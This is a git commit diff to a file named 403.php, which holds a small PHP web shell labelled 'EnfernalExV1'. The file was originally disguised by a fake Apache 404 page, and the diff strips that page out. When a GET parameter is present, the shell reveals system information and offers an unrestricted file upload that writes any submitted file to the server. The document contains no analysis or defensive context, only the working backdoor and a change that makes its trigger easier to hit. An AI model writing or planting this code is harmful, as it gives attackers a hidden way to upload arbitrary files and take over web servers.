fe892b8e57940b4b63b3011ca22bea808358beac
f4ruk1453decodex <133605406+f4ruk1453decodex@users.noreply.github.com>
2023-06-09 16:18:31 +0300

    Update 403.php

--- 403.php
+++ 403.php
@@ -1,14 +1,5 @@
-<html><head>
-<title>404 Not Found</title>
-</head><body>
-<h1>Not Found</h1>
-<p>The requested URL was not found on this server.</p>
-<hr>
-<address>Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.2.0 Server at localhost Port 80</address>
-
-</body></html>
 <?php 
-if ($_GET['Cx'] == 'Cx'){
+if ($_GET['3x']){
     echo '<pre><p>EnfernalExV1</p>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'Uploaded';}else{echo 'Not Uploaded';}}
 }
 ?>
